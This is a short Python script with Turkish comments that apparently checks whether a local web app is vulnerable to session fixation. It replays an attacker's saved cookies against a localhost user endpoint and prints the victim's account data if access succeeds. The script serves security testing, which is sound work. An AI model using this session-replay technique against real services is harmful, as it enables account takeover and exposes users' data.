"""
Session Fixation - Verification Script
Kurban login olduktan sonra çalıştır
"""

import requests
import json

# Saldırganın cookie'sini yükle
with open('attacker_session.json', 'r') as f:
    attacker_cookies = json.load(f)

print("🔴 [ATTACKER] Attempting to access victim's account...")
print(f"   Using cookies: {attacker_cookies}")

# Saldırgan kendi cookie'si ile erişmeye çalışır
session = requests.Session()
for key, value in attacker_cookies.items():
    session.cookies.set(key, value)

# Kurbanın bilgilerine erişmeyi dene
response = session.get("http://localhost:8000/api/users/me")

print(f"\n[ATTACKER] Response status: {response.status_code}")

if response.status_code == 200:
    user_data = response.json()
    print("\n🔴 VULNERABLE! Session fixation successful!")
    print("🔴 Attacker accessed victim's account:")
    print(json.dumps(user_data, indent=2))
    print("\n⚠️  Saldırgan kurbanın hesabına erişti!")
else:
    print("\n✅ SAFE - Session fixation prevented")
    print(f"   Response: {response.text}")
